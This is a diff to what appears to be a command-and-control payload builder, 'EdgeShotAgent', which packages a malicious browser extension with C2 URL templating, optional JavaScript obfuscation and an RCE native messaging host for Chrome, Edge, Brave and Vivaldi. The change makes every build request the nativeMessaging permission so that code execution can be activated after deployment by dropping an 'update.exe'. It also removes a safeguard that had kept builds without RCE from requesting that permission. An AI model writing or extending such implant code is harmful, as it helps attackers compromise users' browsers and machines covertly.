@@ -155,7 +155,7 @@ class EdgeShotAgent(PayloadType):
         BuildParameter(
             name="enable_rce",
             parameter_type=BuildParameterType.Boolean,
-            description="Also drop the Native Messaging rebound binary (RCE), compiled at build time",
+            description="Bundle the RCE native host (source + build script); registers under all browsers (Chrome/Edge/Brave/Vivaldi)",
             default_value=False,
         ),
     ]
@@ -425,7 +425,6 @@ class EdgeShotAgent(PayloadType):
             js_code = js_code.replace("{{GET_URL}}", get_url)
             js_code = js_code.replace("{{POST_URL}}", post_url)
             js_code = js_code.replace("{{QUERY_PARAM}}", query_path_name)
-            js_code = js_code.replace("{{ENABLE_RCE}}", "true" if rce_enabled else "false")
 
             if obfuscate:
                 js_code = obfuscate_js(js_code)
@@ -438,11 +437,9 @@ class EdgeShotAgent(PayloadType):
             manifest_code = manifest_code.replace("{{ADDONNAME}}", addon_name)
             manifest_code = manifest_code.replace("{{VERSION}}", version)
             manifest_code = manifest_code.replace("{{DESCRIPTION}}", description)
-            # nativeMessaging is only requested when RCE is enabled (a "clean"
-            # extension without RCE should not ask for the permission).
-            manifest_code = manifest_code.replace(
-                "{{NATIVE_MESSAGING}}", '"nativeMessaging",' if rce_enabled else ""
-            )
+            # nativeMessaging is always in the manifest (hardcoded): the RCE
+            # capability is inert until the host is installed, and post-deployment
+            # RCE setup needs the permission to already be present.
 
             # --- 3. Resolve extension icons (custom upload or default logo) --
             icons = await self._resolve_icons(extension_icon_id)
@@ -523,7 +520,7 @@ class EdgeShotAgent(PayloadType):
                 " RCE native host source bundled under rce/ (compile it locally, "
                 "then drop via execute_file)."
                 if rce_enabled
-                else " RCE disabled."
+                else " RCE native host not bundled (drop update.exe via execute_file to activate)."
             )
         )
         return zip_buffer.getvalue(), build_message
@@ -604,7 +601,7 @@ class EdgeShotAgent(PayloadType):
                 " RCE native host source bundled under rce/ (compile it locally, "
                 "then drop via execute_file)."
                 if rce_enabled
-                else " RCE disabled."
+                else " RCE native host not bundled (drop update.exe via execute_file to activate)."
             )
         )
         return zip_buffer.getvalue(), build_message
@@ -711,7 +708,7 @@ class EdgeShotAgent(PayloadType):
                 " RCE native host source bundled under rce/ (compile it locally, "
                 "then drop via execute_file)."
                 if rce_enabled
-                else " RCE disabled."
+                else " RCE native host not bundled (drop update.exe via execute_file to activate)."
             )
         )
         return zip_buffer.getvalue(), build_message
